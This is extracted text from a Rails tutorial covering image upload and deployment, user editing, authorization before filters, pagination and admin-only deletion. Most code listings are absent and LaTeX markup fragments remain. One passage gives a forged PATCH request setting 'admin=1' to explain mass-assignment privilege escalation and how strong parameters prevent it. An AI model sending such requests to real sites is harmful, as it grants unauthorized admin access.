As with production email configuration (Listing~\ref{code:sendgrid_config}), Listing~\ref{code:carrier_wave_configuration} uses Heroku \kode{ENV} variables to avoid hard-coding sensitive information.
In Section~\ref{sec:email_in_production}, these variables were defined automatically via the SendGrid add-on, but in this case we need to define them explicitly, which we can accomplish using \kode{heroku config:set} as follows:
With the configuration above, we are ready to commit our changes and deploy.
I recommend updating your \kode{.gitignore} file as shown in Listing~\ref{code:gitignore_uploads} so that the image uploads directory is ignored.
Adding the uploads directory to the \kode{.gitignore} file.
We're now ready to commit the changes on our topic branch and merge back to master:
Then we deploy, reset the database, and reseed the sample data:
Because Heroku comes with an installation of ImageMagick, the result is successful image resizing and upload in production, as seen in Figure~\ref{fig:image_upload_production}.
Image upload in production.
With the addition of the Microposts resource, we are nearly finished with our sample application.
All that remains is to add a social layer by letting users follow each other.
We'll learn how to model such user relationships, and see the implications for the microposts feed, in Chapter~\ref{cha:following_users}.
If you skipped Section~\ref{sec:image_upload_in_production}, be sure to commit and merge your changes:
Then deploy to production:
It's worth noting that this chapter saw the last of the necessary gem installations.
in Listing~\ref{code:final_gemfile}.
The final \kode{Gemfile} for the sample application.
}<n>%= <<(chapters/gemfiles/sample_app/Gemfile, lang: ruby)<n>\end{codelisting}<n><n>\subsection{What we learned in this chapter} % (fold)<n>\label{sec:user_microposts_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
Microposts, like Users, are modeled as a resource backed by an Active Record model.
Rails supports multiple-key indices.
We can model a user having many microposts using the \kode{has\_many} and \kode{belongs\_to} methods in the User and Micropost models, respectively.
The \kode{has\_many}/\kode{belongs\_to} combination gives rise to methods that work through the association.
The code \kode{user.microposts.build(...)} returns a new Micropost object automatically associated with the given user.
Rails supports default ordering via \kode{default\_scope}.
Scopes take anonymous functions as arguments.
The \kode{dependent: :destroy} option causes objects to be destroyed at the same time as associated objects.
Pagination and object counts can both be performed through associations, leading to automatically efficient code.
Fixtures support the creation of associations.
It is possible to pass variables to Rails partials.
The \kode{where} method can be used to perform Active Record selections.
We can enforce secure operations by always creating and destroying dependent objects through their association.
We can upload and resize images using CarrierWave.
Refactor the Home page to use separate partials for the two branches of the \kode{if}-\kode{else} statement.
Add tests for the sidebar micropost count (including proper pluralization).
Listing~\ref{code:sidebar_micropost_count} will help get you started.
Following the template in Listing~\ref{code:image_upload_test}, write a test of the image uploader in Section~\ref{sec:micropost_images}.
To avoid a confusing error, you will also need to configure CarrierWave to skip image resizing in tests by creating an initializer file as shown in Listing~\ref{code:skip_resize_initializer}.
The additional assertions in Listing~\ref{code:image_upload_test} check both for a file upload field on the Home page and for a valid image attribute on the micropost resulting from valid submission.
\emph{Hint}: To check for a valid \kode{picture} attribute, use the \kode{assigns} method mentioned in Section~\ref{sec:activation_test_and_refactoring} to access the micropost in the \kode{create} action after valid submission.
A template for the sidebar micropost count test.
"0 microposts"
A template for testing image upload.
An initializer to skip image resizing in tests.
In this chapter, we will complete the REST actions for the Users resource (Table~\ref{table:RESTful_users}) by adding \kode{edit}, \kode{update}, \kode{index}, and \kode{destroy} actions.
We'll start by giving users the ability to update their profiles, which will also provide a natural opportunity to enforce an authorization model (made possible by the authentication code in Chapter~\ref{cha:log_in_log_out}).
Then we'll make a listing of all users (also requiring authentication), which will motivate the introduction of sample data and pagination.
Finally, we'll add the ability to destroy users, wiping them clear from the database.
Since we can't allow just any user to have such dangerous powers, we'll take care to create a privileged class of administrative users authorized to delete other users.
<n><n>  \section{Updating users} % (fold)<n>  \label{sec:updating_users}<n><n>
The pattern for editing user information closely parallels that for creating new users (Chapter~\ref{cha:sign_up}).
The biggest difference is that, while anyone can sign up, only the current user should be able to update their information.
The authentication machinery from Chapter~\ref{cha:log_in_log_out} will allow us to use a \emph{before filter} to ensure that this is the case.
To get started, let's start work on an \kode{updating-users} topic branch:
We start with the \kode{edit} action, which requires pulling the relevant user out of the database.
Note from Table~\ref{table:RESTful_users} that the proper URL for a user's edit page is /users/1/edit (assuming the user's id is~\texttt{1}).
Recall that the id of the user is available in the \kode{params[:id]} variable, which means that we can find the user with the code in Listing~\ref{code:initial_edit_action}.
A mockup of the user edit page.
The user \kode{edit} action.
The corresponding user edit view (which you will have to create by hand) is shown in Listing~\ref{code:user_edit_view}.
Note how closely this resembles the new user view from Listing~\ref{code:signup_form}; the large overlap suggests factoring the repeated code into a partial, which is left as an exercise (Section~\ref{sec:updating_deleting_exercises}).
The user edit view.
Here we have reused the shared \kode{error\_messages} partial introduced in Section~\ref{sec:signup_error_messages}.
By the way, the use of \kode{target="\_blank"} in the Gravatar link is a neat trick to get the browser to open the page in a new window or tab, which is convenient behavior when linking to a third-party site.
With the \kode{@user} instance variable from Listing~\ref{code:initial_edit_action}, the edit page should render properly, as shown in Figure~\ref{fig:edit_page}.
The ``Name'' and ``Email'' fields in Figure~\ref{fig:edit_page} also shows how Rails automatically pre-fills the Name and Email fields using the attributes of the existing \kode{@user} variable.
Looking at the HTML source for Figure~\ref{fig:edit_page}, we see a form tag as expected, as in Listing~\ref{code:edit_form_html} (slight details may differ).
HTML for the edit form defined in Listing~\ref{code:user_edit_view} and shown in Figure~\ref{fig:edit_page}.
Note here the hidden input field
Since web browsers can't natively send \texttt{PATCH} requests (as required by the REST conventions from Table~\ref{table:RESTful_users}), Rails fakes it with a \texttt{POST} request and a hidden \kode{input} field
Don't worry about how this works; the details are of interest to developers of the Rails framework itself, and by design are not important for Rails application developers.
There's another subtlety to address here: the code \kode{form\_for(@user)} in Listing~\ref{code:user_edit_view} is \emph{exactly} the same as the code in Listing~\ref{code:signup_form}---so how does Rails know to use a \texttt{POST} request for new users and a \texttt{PATCH} for editing users?
The answer is that it is possible to tell whether a user is new or already exists in the database via Active Record's \kode{new\_record?}\ boolean method:
When constructing a form using \kode{form\_for(@user)}, Rails uses \texttt{POST} if \linebreak \kode{@user.new\_record?}\ is \kode{true} and \texttt{PATCH} if it is \kode{false}.
As a final touch, we'll fill in the URL of the settings link in the site navigation.
This is easy using the named route \kode{edit\_user\_path} from Table~\ref{table:RESTful_users}, together with the handy \kode{current\_user} helper method defined in Listing~\ref{code:persistent_current_user}:
The full application code appears in Listing~\ref{code:settings_link}).
Adding a URL to the ``Settings'' link in the site layout.
In this section we'll handle unsuccessful edits, following similar ideas to unsuccessful signups (Section~\ref{sec:unsuccessful_signups}).
We start by creating an \kode{update} action, which uses \kode{update\_attributes} (Section~\ref{sec:updating_user_objects}) to update the user based on the submitted \kode{params} hash, as shown in Listing~\ref{code:user_update_action_unsuccessful}.
With invalid information, the update attempt returns \kode{false}, so the \kode{else} branch renders the edit page.
We've seen this pattern before; the structure closely parallels the first version of the \kode{create} action (Listing~\ref{code:first_create_action}).
The initial user \kode{update} action.
# Handle a successful update.
Note the use of \kode{user\_params} in the call to \kode{update\_attributes}, which uses strong parameters to prevent mass assignment vulnerability (as described in Section~\ref{sec:strong_parameters}).
Because of the existing User model validations and the error-messages partial in Listing~\ref{code:user_edit_view}, submission of invalid information results in helpful error messages (Figure~\ref{fig:buggy_edit_with_invalid_information}).
Error message from submitting the update form.
We left Section~\ref{sec:unsuccessful_edits} with a working edit form.
Our first step is to generate an integration test as usual:
Then we'll write a simple test of an unsuccessful edit, as shown in Listing~\ref{code:unsuccessful_edit_test}.
The test in Listing~\ref{code:unsuccessful_edit_test} checks for the correct behavior by verifying that the edit template is rendered after getting the edit page and re-rendered upon submission of invalid information.
Note the use of the \kode{patch} method to issue a \texttt{PATCH} request, which follows the same pattern as \kode{get}, \kode{post}, and \kode{delete}.
A test for an unsuccessful edit. 
Now it's time to get the edit form to work.
Editing the profile images is already functional since we've outsourced image upload to the Gravatar website; we can edit Gravatars by clicking on the ``change'' link from Figure~\ref{fig:edit_page}, as shown in Figure~\ref{fig:gravatar_cropper}.
Let's get the rest of the user edit functionality working as well.
The  \href{http://gravatar.com/}{Gravatar} image-cropping interface, with a picture of \href{http://www.michaelhartl.com/}{some dude}.
As you get more comfortable with testing, you might find that it's useful to write integration tests before writing the application code instead of after.
In this context, such tests are sometimes known as \emph{acceptance tests}, since they determine when a particular feature should be accepted as complete.
To see how this works, we'll complete the user edit feature using test-driven development.
We'll test for the correct behavior of updating users by writing a test similar to the one shown in Listing~\ref{code:unsuccessful_edit_test}, only this time we'll submit valid information.
Then we'll check for a nonempty flash message and a successful redirect to the profile page, while also verifying that the user's information correctly changed in the database.
The result appears in Listing~\ref{code:successful_edit_test}
Note that the password and confirmation in Listing~\ref{code:successful_edit_test} are blank, which is convenient for users who don't want to update their passwords every time they update their names or email addresses.
Note also the use of \kode{@user.reload} (first seen in Section~\ref{sec:updating_user_objects}) to reload the user's values from the database and confirm that they were successfully updated.
(This is the kind of detail you could easily forget initially, which is why acceptance testing (and TDD generally) require a certain level of experience to be effective.)
A test of a successful edit. 
The \kode{update} action needed to get the tests in Listing~\ref{code:successful_edit_test} to pass is similar to the final form of the \kode{create} action (Listing~\ref{code:login_upon_signup}), as seen in Listing~\ref{code:user_update_action}.
The user \kode{update} action. 
in Listing~\ref{code:successful_edit_test}.
To get the tests to \passing, we need to make an exception to the password validation if the password is empty.
We can do this by passing the \kode{allow\_nil: true} option to \kode{validates}, as seen in Listing~\ref{code:allow_blank_password}.
Allowing empty passwords on update. 
With the code in this section, the user edit page should be working (Figure~\ref{fig:edit_form_working}), as you can double-check by re-running the test suite, which should now be \passing:
The result of a successful edit.
In the context of web applications, \emph{authentication} allows us to identify users of our site, and \emph{authorization} lets us control what they can do.
One nice effect of building the authentication machinery in Chapter~\ref{cha:log_in_log_out} is that we are now in a position to implement authorization as well.
Although the edit and update actions from Section~\ref{sec:updating_users} are functionally complete, they suffer from a ridiculous security flaw: they allow anyone (even non-logged-in users) to access either action, and any logged-in user can update the information for any other user.
In this section, we'll implement a security model that requires users to be logged in and prevents them from updating any information other than their own.
In Section~\ref{sec:requiring_logged_in_users}, we'll handle the case of<n>non-logged-in users who try to access a protected page to which they might normally have access.
Because this could easily happen in the normal course of using the application, such users will be forwarded to the login page with a helpful message, as mocked up in Figure~\ref{fig:login_page_protected_mockup}.
On the other hand, users who try to access a page for which they would never be authorized (such as a logged-in user trying to access a different user's edit page) will be redirected to the root URL (Section~\ref{sec:requiring_the_right_user}).
<n><n>\begin{figure}<n>\begin{center}<n>\imagebox{images/figures/login_page_protected_mockup.png}<n>\end{center}<n>\caption{A mockup of the result of visiting a protected page\label{fig:login_page_protected_mockup}}<n>\end{figure}<n><n>    \subsection{Requiring logged-in users} % (fold)<n>    \label{sec:requiring_logged_in_users}<n><n>
To implement the forwarding behavior shown in Figure~\ref{fig:login_page_protected_mockup}, we'll use a \emph{before filter} in the Users controller.
Before filters use the \kode{before\_action} command to arrange for a particular method to be called before the given actions
To require users to be logged in, we define a \kode{logged\_in\_user} method and invoke it using \kode{before\_action :logged\_in\_user}, as shown in Listing~\ref{code:authorize_before_filter}.
Adding a \kode{logged\_in\_user} before filter. 
By default, before filters apply to \emph{every} action in a controller, so here we restrict the filter to act only on the \kode{:edit} and \kode{:update} actions by passing the appropriate \kode{:only} options hash.
We can see the result of the before filter in Listing~\ref{code:authorize_before_filter} by logging out and attempting to access the user edit page \href{http://localhost:3000/users/1/edit}{/users/1/edit}, as seen in Figure~\ref{fig:protected_log_in}.
The login form after trying to access a protected page.
The reason is that the edit and update actions now require a logged-in user, but no user is logged in inside the corresponding tests.
We'll fix our test suite by logging the user in before hitting the edit or update actions.
This is easy using the \kode{log\_in\_as} helper developed in Section~\ref{sec:remember_tests} (Listing~\ref{code:test_helper_log_in}), as shown in Listing~\ref{code:edit_tests_logged_in}.
Logging in a test user. 
(We could eliminate some duplication by putting the test login in the \kode{setup} method of Listing~\ref{code:edit_tests_logged_in}, but in Section~\ref{sec:friendly_forwarding} we'll change one of the tests to visit the edit page \emph{before} logging in, which isn't possible if the login step happens during the test setup.)
At this point, our test suite should be green:
Even though our test suite is now passing, we're not finished with the before filter, because the suite is still \passing\ even if we remove our security model, as you can verify by commenting it out (Listing~\ref{code:commented_out_before_filter}).
Let's write tests to arrange that.
Commenting out the before filter to test our security model. 
Because the before filter operates on a per-action basis, we'll put the corresponding tests in the Users controller test. The plan is to hit the \kode{edit} and \kode{update} action with the right kinds of requests and verify that the flash is set and that the user is redirected to the login path.
From Table~\ref{table:RESTful_users}, we see that the proper requests are \texttt{GET} and \texttt{PATCH}, respectively, which means using the \kode{get} and \kode{patch} methods inside the tests.
The results appear in Listing~\ref{code:edit_update_redirect_tests}.
Testing that \kode{edit} and \kode{update} are protected. 
Note the arguments to \kode{get} and \kode{patch} involve code like
This uses the Rails convention of \kode{id: @user}, which (as in controller redirects) automatically uses \kode{@user.id}.
In the second case, we need to supply an additional \kode{user} hash in order for the routes to work properly.
(If you look at the generated Users controller tests from the toy app in Chapter~\ref{cha:a_toy_app}, you'll see the code above.)
To get it to \passing, just uncomment the before filter (Listing~\ref{code:uncommented_before_filter}).
Uncommenting the before filter. 
With that, our test suite should be \passing:
Any accidental exposure of the edit methods to unauthorized users will now be caught immediately by our test suite.
Of course, requiring users to log in isn't quite enough; users should only be allowed to edit their \emph{own} information.
As we saw in Section~\ref{sec:requiring_logged_in_users}, it's easy to have a test suite that misses an essential security flaw, so we'll proceed using test-driven development to be sure our code implements the security model correctly.
To do this, we'll add tests to the Users controller test to complement the ones shown in Listing~\ref{code:edit_update_redirect_tests}.
In order to make sure users can't edit other users' information, we need to be able to log in as a second user.
This means adding a second user to our users fixture file, as shown in Listing~\ref{code:fixture_second_user}.
Adding a second user to the fixture file.
By using the \kode{log\_in\_as} method defined in Listing~\ref{code:test_helper_log_in}, we can test the \kode{edit} and \kode{update} actions as in Listing~\ref{code:edit_update_wrong_user_tests}.
Note that we expect to redirect users to the root path instead of the login path because a user trying to edit a different user would already be logged in.
Tests for trying to edit as the wrong user. 
To redirect users trying to edit another user's profile, we'll add a second method called \kode{correct\_user}, together with a before filter to call it (Listing~\ref{code:correct_user_before_filter}).
Note that the \kode{correct\_user} before filter defines the \kode{@user} variable, so Listing~\ref{code:correct_user_before_filter} also shows that we can eliminate the \kode{@user} assignments in the \kode{edit} and \kode{update} actions.
A \kode{correct\_user} before filter to protect the edit/update pages. 
At this point, our test suite should be \passing:
We'll use this method to replace code like
with the (slightly) more expressive
The \kode{current\_user?}\ 
Replacing the direct comparison with the boolean method gives the code shown in Listing~\ref{code:correct_user_before_filter_boolean}.
The final \kode{correct\_user} before filter. 
Our site authorization is complete as written, but there is one minor blemish: when users try to access a protected page, they are currently redirected to their profile pages regardless of where they were trying to go.
In other words, if a non-logged-in user tries to visit the edit page, after logging in the user will be redirected to /users/1 instead of /users/1/edit.
It would be much friendlier to redirect them to their intended destination instead.
The application code will turn out to be relatively complicated, but we can write a ridiculously simple test for friendly forwarding just by reversing the order of logging in and visiting the edit page in Listing~\ref{code:edit_tests_logged_in}.
As seen in Listing~\ref{code:friendly_forwarding_test}, the resulting test tries to visit the edit page, then logs in, and then checks that the user is redirected to the \emph{edit} page instead of the default profile page.
(Listing~\ref{code:friendly_forwarding_test} also removes the test for rendering the edit template since that's no longer the expected behavior.)
A test for friendly forwarding. 
Now that we have a failing test, we're ready to implement friendly forwarding
The code in this section is adapted from the \href{http://github.com/thoughtbot/clearance}{Clearance} gem by \href{http://thoughtbot.com/}{thoughtbot}.
In order to forward users to their intended destination, we need to store the location of the requested page somewhere, and then redirect to that location instead of to the default.
We accomplish this with a pair of methods, \kode{store\_location} and \kode{redirect\_back\_or}, both defined in the Sessions helper (Listing~\ref{code:friendly_forwarding_code}).
Code to implement friendly forwarding.
# Redirects to stored location (or to the default).
Here the storage mechanism for the forwarding URL is the same \kode{session} facility we used in Section~\ref{sec:a_working_log_in_method} to log the user in.
Listing~\ref{code:friendly_forwarding_code} also uses the \kode{request} object (via \kode{request.url}) to get the URL of the requested page.
The \kode{store\_location} method in Listing~\ref{code:friendly_forwarding_code} puts the requested URL in the \kode{session} variable under the key \kode{:forwarding\_url}, but only for a \kode{GET} request.
This prevents storing the forwarding URL if a user, say, submits a form when not logged in (which is an edge case but could happen if, e.g., a user deleted the session cookies by hand before submitting the form).
In such a case, the resulting redirect would issue a \kode{GET} request to a URL expecting \kode{POST}, \kode{PATCH}, or \kode{DELETE}, thereby causing an error.
Including \kode{if request.get?}\ prevents this from happening
Thanks to reader Yoel Adler for pointing out this subtle issue, and for discovering the solution.
as shown in Listing~\ref{code:add_store_location}.
Adding \kode{store\_location} to the logged-in user before filter.
To implement the forwarding itself, we use the \kode{redirect\_back\_or} \linebreak method to redirect to the requested URL if it exists, or some default URL otherwise, which we add to the Sessions controller \kode{create} action to redirect after successful login (Listing~\ref{code:friendly_session_create}).
The \kode{redirect\_back\_or} method uses the or operator~\kode{||} through
(Testing for this is left as an exercise (Section~\ref{sec:updating_deleting_exercises}).)
Also note that the session deletion occurs even though the line with the redirect appears first; redirects don't happen until an explicit \kode{return} or the end of the method, so any code appearing after the redirect is still executed.
The Sessions \kode{create} action with friendly forwarding.
With that, the friendly forwarding integration test in Listing~\ref{code:friendly_forwarding_test} should pass, and the basic user authentication and page protection implementation is complete.
As usual, it's a good idea to verify that the test suite is \passing\ before proceeding:
In this section, we'll add the \href{http://www.answers.com/penultimate}{penultimate} user action, the \kode{index} action, which is designed to display \emph{all} the users instead of just one.
Along the way, we'll learn how to seed the database with sample users and how to \emph{paginate} the user output so that the index page can scale up to display a potentially large number of users.
A mockup of the result---users, pagination links, and a ``Users'' navigation link---appears in Figure~\ref{fig:user_index_mockup}
A mockup of the users index page.
\label{fig:user_index_mockup}}<n>\end{figure}<n><n><n>    \subsection{Users index} % (fold)<n>    \label{sec:users_index}<n><n>
To get started with the users index, we'll first implement a security model.
Although we'll keep individual user \kode{show} pages visible to all site visitors, the user \kode{index} will be restricted to logged-in users so that there's a limit to how much unregistered users can see by default
This is the same authorization model used by Twitter.
To protect the \kode{index} page from unauthorized access, we'll first add a short test to verify that the \kode{index} action is redirected properly (Listing~\ref{code:index_action_redirected_test}).
Testing the \kode{index} action redirect. 
Then we just need to add an \kode{index} action and include it in the list of actions protected by the \kode{logged\_in\_user} before filter (Listing~\ref{code:logged_in_user_index}).
Requiring a logged-in user for the \kode{index} action. 
To display the users themselves, we need to make a variable containing all the site's users and then render each one by iterating through them in the index view.
As you may recall from the corresponding action in the toy app (Listing~\ref{code:demo_index_action}), we can use \kode{User.all} to pull all the users out of the database, assigning them to an \kode{@users} instance variable for use in the view, as seen in Listing~\ref{code:user_index}.
(If displaying all the users at once seems like a bad idea, you're right, and we'll remove this blemish in Section~\ref{sec:pagination}.)
The user \kode{index} action.
To make the actual index page, we'll make a view (whose file you'll have to create) that iterates through the users and wraps each one in an~\kode{li} tag.
We do this with the \kode{each} method, displaying each user's Gravatar and name, while wrapping the whole thing in a \kode{ul} tag (Listing~\ref{code:user_index_view}).
The users index view.
The code in Listing~\ref{code:user_index_view} uses the result of Listing~\ref{code:gravatar_option} from Section~\ref{sec:signup_exercises}, which allows us to pass an option to the Gravatar helper specifying a size other than the default.
If you didn't do that exercise, update your Users helper file with the contents of Listing~\ref{code:gravatar_option} before proceeding.
Let's also add a little CSS (or, rather, SCSS) for style (Listing~\ref{code:user_index_css}).
CSS for the users index.
Finally, we'll add the URL to the users link in the site's navigation header using \kode{users\_path}, thereby using the last of the unused named routes in Table~\ref{table:RESTful_users}.
The result appears in Listing~\ref{code:users_link}
Adding the URL to the users link.
With that, the users index is fully functional, with all tests \passing:
Let's remedy this sad situation.
The users index page with only one user.
In this section, we'll give our lonely sample user some company.
Of course, to create enough users to make a decent users index, we \emph{could} use our web browser to visit the signup page and make the new users one by one, but a far better solution is to use Ruby (and Rake) to make the users for us.
Then install as usual:
Next, we'll add a Rake task to seed the database with sample users, for which Rails uses the standard location \kode{db/seeds.rb}.
The result appears in Listing~\ref{code:db_seed}
(The code in Listing~\ref{code:db_seed} is a bit advanced, so don't worry too much about the details.)
A Rake task for seeding the database with sample users.
The code in Listing~\ref{code:db_seed} creates an example user with name and email address replicating our previous one, and then makes 99 more.
The \kode{create!}\ method is just like the \kode{create} method, except it raises an exception (Section~\ref{sec:finding_user_objects}) for an invalid user rather than returning \kode{false}.
This behavior makes debugging easier by avoiding silent errors.
With the code as in Listing~\ref{code:db_seed}, we can reset the database and then invoke the Rake task using \kode{db:seed}
In principle, these two tasks can be combined in \kode{rake db:reset}, but as of this writing this command doesn't work with the latest version of Rails.
Seeding the database can be slow, and on some systems could take up to a few minutes.
After running the \kode{db:seed} Rake task, our application has 100 sample users.
As seen in Figure~\ref{fig:user_index_all}, I've taken the liberty of associating the first few sample addresses with Gravatars so that they're not all the default Gravatar image.
(You may have to restart the webserver at this point.)
The users index page with 100 sample users.
Our original user doesn't suffer from loneliness any more, but now we have the opposite problem: our user has \emph{too many} companions, and they all appear on the same page.
Right now there are a hundred, which is already a reasonably large number, and on a real site it could be thousands.
The solution is to \emph{paginate} the users, so that (for example) only 30 show up on a page at any one time.
There are several pagination methods in Rails; we'll use one of the simplest and most robust, called \href{http://wiki.github.com/mislav/will_paginate/}{will\_paginate}.
in Listing~\ref{code:will_paginate_gem}.
Then run \kode{bundle install}:
You should also restart the web server to ensure that the new gems are loaded properly.
To get pagination working, we need to add some code to the index view telling Rails to paginate the users, and we need to replace \kode{User.all} in the \kode{index} action with an object that knows about pagination.
We'll start by adding the special \kode{will\_paginate} method in the view (Listing~\ref{code:will_paginate_index_view}); we'll see in a moment why the code appears both above and below the user list.
The users index with pagination.
The \kode{will\_paginate} method is a little magical; inside a \kode{users} view, it automatically looks for an \kode{@users} object, and then displays pagination links to access other pages.
The view in Listing~\ref{code:will_paginate_index_view} doesn't work yet, though, because currently \kode{@users} contains the results of \kode{User.all} (Listing~\ref{code:user_index}), whereas \kode{will\_paginate} requires that we paginate the results explicitly using the \kode{paginate} method:
Note that \kode{paginate} takes a hash argument with key \kode{:page} and value equal to the page requested.
So, for example, page~1 is users 1--30, page~2 is users 31--60, etc. If \kode{page} is \kode{nil}, \kode{paginate} simply returns the first page.
Using the \kode{paginate} method, we can paginate the users in the sample application by using \kode{paginate} in place of \kode{all} in the \kode{index} action (Listing~\ref{code:will_paginate_index_action}).
Here the \kode{page} parameter comes from \kode{params[:page]}, which is generated automatically by \kode{will\_paginate}.
Paginating the users in the \kode{index} action.
The users index page should now be working, appearing as in Figure~\ref{fig:user_index_pagination}.
(On some systems, you may have to restart the Rails server at this point.)
Because we included \kode{will\_paginate} both above and below the user list, the pagination links appear in both places.
The users index page with pagination.
If you now click on either the~\href{http://localhost:3000/users?page=2}{2} link or \href{http://localhost:3000/users?page=2}{Next} link, you'll get the second page of results, as shown in Figure~\ref{fig:user_index_page_two_rails_3}.
Page 2 of the users index.
Now that our users index page is working, we'll write a lightweight test for it, including a minimal test for the pagination from Section~\ref{sec:pagination}.
The idea is to log in, visit the index path, verify the first page of users is present, and then confirm that pagination is present on the page.
For these last two steps to work, we need to have enough users in the test database to invoke pagination, i.e., more than 30.
We created a second user in the fixtures in Listing~\ref{code:fixture_second_user}, but 30 or so more users is a lot to create by hand.
Luckily, as we've seen with the user fixture's \kode{password\_digest} attribute, fixture files support embedded Ruby, which \linebreak means we can create 30 additional users as shown in Listing~\ref{code:users_fixtures_extra_users}.
(Listing~\ref{code:users_fixtures_extra_users} also creates a couple of other named users for future reference.)
Adding 30 extra users to the fixture.
With the fixtures defined in Listing~\ref{code:users_fixtures_extra_users}, we're ready to write a test of the users index.
First we generate the relevant test:
The test itself involves checking for a \kode{div} with the required \kode{pagination} class and verifying that the first page of users is present.
The result appears in Listing~\ref{code:user_index_test}
A test of the users index, including pagination. 
The result should be a \passing\ test suite:
The paginated users index is now complete, but there's one improvement I can't resist including: Rails has some incredibly slick tools for making compact views, and in this section we'll refactor the index page to use them.
Because our code is well-tested, we can refactor with confidence, assured that we are unlikely to break our site's functionality.
The first step in our refactoring is to replace the user~\kode{li} from Listing~\ref{code:will_paginate_index_view} with a \kode{render} call (Listing~\ref{code:index_view_first_refactoring}).
The first refactoring attempt in the index view.
The name \kode{user} is immaterial---we could have written \kode{@users.each do |foobar|} and then used \kode{render foobar}.
The key is the \emph{class} of the object---in this case, \kode{User}.
A partial to render a single user.
This is a definite improvement, but we can do even better: we can call \kode{render} \emph{directly} on the \kode{@users} variable (Listing~\ref{code:index_final_refactoring}).
The fully refactored users index. 
The result is the impressively compact code in Listing~\ref{code:index_final_refactoring}.
As with any refactoring, you should verify that the test suite is still \passing\ after changing the application code:
Now that the users index is complete, there's only one canonical REST action left: \kode{destroy}.
In this section, we'll add links to delete users, as mocked up in Figure~\ref{fig:user_index_delete_links_mockup}, and define the \kode{destroy} action necessary to accomplish the deletion.
But first, we'll create the class of administrative users, or \emph{admins}, authorized to do so.
A mockup of the users index with delete links.
\label{fig:user_index_delete_links_mockup}}<n>\end{figure}<n><n>    \subsection{Administrative users} % (fold)<n>    \label{sec:administrative_users}<n><n>
We will identify privileged administrative users with a boolean \kode{admin} attribute in the User model, which will lead automatically to an \kode{admin?}\ boolean method to test for admin status.
The resulting data model appears in Figure~\ref{fig:user_model_admin}.
The User model with an added \kode{admin} boolean attribute.
The migration adds the \kode{admin} column to the \kode{users} table, as shown in Listing~\ref{code:admin_migration}.
Note that we've added the argument \kode{default: false} to \kode{add\_column} in Listing~\ref{code:admin_migration}, which means that users will \emph{not} be administrators by default.
(Without the \kode{default: false} argument, \kode{admin} will be \kode{nil} by default, which is still \kode{false}, so this step is not strictly necessary.
It is more explicit, though, and communicates our intentions more clearly both to Rails and to readers of our code.)
The migration to add a boolean \kode{admin} attribute to users.
Next, we migrate as usual:
As expected, Rails figures out the boolean nature of the \kode{admin} attribute and automatically adds the question-mark method \kode{admin?}:
Here we've used the \kode{toggle!}\ method to flip the \kode{admin} attribute from \kode{false} to \kode{true}.
As a final step, let's update our seed data to make the first user an admin by default (Listing~\ref{code:populator_with_admin}).
The seed data code with an admin user.
Then reset the database:
Revisiting strong parameters
You might have noticed that Listing~\ref{code:populator_with_admin} makes the user an admin by including \kode{admin: true} in the initialization hash.
This underscores the danger of exposing our objects to the wild Web: if we simply passed an initialization hash in from an arbitrary web request, a malicious user could send a \texttt{PATCH} request as follows
Command-line tools such as \texttt{curl} can issue \texttt{PATCH} requests of this form.
patch /users/17?
admin=1
This request would make user 17 an admin, which would be a potentially serious security breach.
Because of this danger, it is essential that we only update attributes that are safe to edit through the web.
As noted in Section~\ref{sec:strong_parameters}, this is accomplished using \emph{strong parameters} by calling \kode{require} and \kode{permit} on the \kode{params} hash:
Note in particular that \kode{admin} is \emph{not} in the list of permitted attributes.
This is what prevents arbitrary users from granting themselves administrative access to our application.
Because of its importance, it's a good idea to write a test for any attribute that isn't editable, and writing such a test for the \kode{admin} attribute is left as an exercise (Section~\ref{sec:updating_deleting_exercises}).
The final step needed to complete the Users resource is to add delete links and a \kode{destroy} action.
We'll start by adding a delete link for each user on the users index page, restricting access to administrative users.
The resulting \kode{"delete"} links will be displayed only if the current user is an admin (Listing~\ref{code:delete_links}).
User delete links (viewable only by admins).
Note the \kode{method: :delete} argument, which arranges for the link to issue the necessary \texttt{DELETE} request. We've also wrapped each link inside an~\kode{if} statement so that only admins can see them.
The result for our admin user appears in Figure~\ref{fig:index_delete_links_rails_3}.
Web browsers can't send \texttt{DELETE} requests natively, so Rails fakes them with JavaScript.
This means that the delete links won't work if the user has JavaScript disabled.
If you must support non-JavaScript-enabled browsers you can fake a \texttt{DELETE} request using a form and a \texttt{POST} request, which works even without JavaScript
See the RailsCast on ``\href{http://railscasts.com/episodes/77-destroy-without-javascript}{Destroy Without JavaScript}'' for details.
The users index with delete links.
To get the delete links to work, we need to add a \kode{destroy} action (Table~\ref{table:RESTful_users}), which finds the corresponding user and destroys it with the Active Record \kode{destroy} method, finally redirecting to the users index, as seen in Listing~\ref{code:destroy_action}.
Because users have to be logged in to delete users, Listing~\ref{code:destroy_action} also adds \kode{:destroy} to the \kode{logged\_in\_user} before filter.
Adding a working \kode{destroy} action.
Note that the \kode{destroy} action uses method chaining to combine the \kode{find} and \kode{destroy} into one line:
As constructed, only admins can destroy users through the web since only they can see the delete links, but there's still a terrible security hole: any sufficiently sophisticated attacker could simply issue a \texttt{DELETE} request directly from the command line to delete any user on the site.
To secure the site properly, we also need access control on the \kode{destroy} action, so that \emph{only} admins can delete users.
As in Section~\ref{sec:requiring_logged_in_users} and Section~\ref{sec:requiring_the_right_user}, we'll enforce access control using a before filter, this time to restrict access to the \kode{destroy} action to admins.
The resulting \kode{admin\_user} before filter appears in Listing~\ref{code:admin_destroy_before_filter}.
A before filter restricting the \kode{destroy} action to admins.
# Confirms an admin user.
With something as dangerous as destroying users, it's important to have good tests for the expected behavior.
We start by arranging for one of our fixture users to be an admin, as shown in Listing~\ref{code:fixture_user_admin}.
Making one of the fixture users an admin.
Following the practice from Section~\ref{sec:requiring_logged_in_users}, we'll put action-level tests of access control in the Users controller test file.
As with the logout test in Listing~\ref{code:user_logout_test}, we'll use \kode{delete} to issue a \texttt{DELETE} request directly to the \kode{destroy} action.
We need to check two cases: first, users who aren't logged in should be redirected to the login page; second, users who are logged in but who aren't admins should be redirected to the Home page.
The result appears in Listing~\ref{code:action_tests_admin}
Action-level tests for admin access control. 
Note that Listing~\ref{code:action_tests_admin} also makes sure that the user count doesn't change using the \kode{assert\_no\_difference} method (seen before in Listing~\ref{code:a_test_for_invalid_submission}).
The tests in Listing~\ref{code:action_tests_admin} verify the behavior in the case of an unauthorized (non-admin) user, but we also want to check that an admin can use a delete link to successfully destroy a user.
Since the delete links appear on the users index, we'll add these tests to the users index test from Listing~\ref{code:user_index_test}.
The only really tricky part is verifying that a user gets deleted when an admin clicks on a delete link, which we'll accomplish as follows:
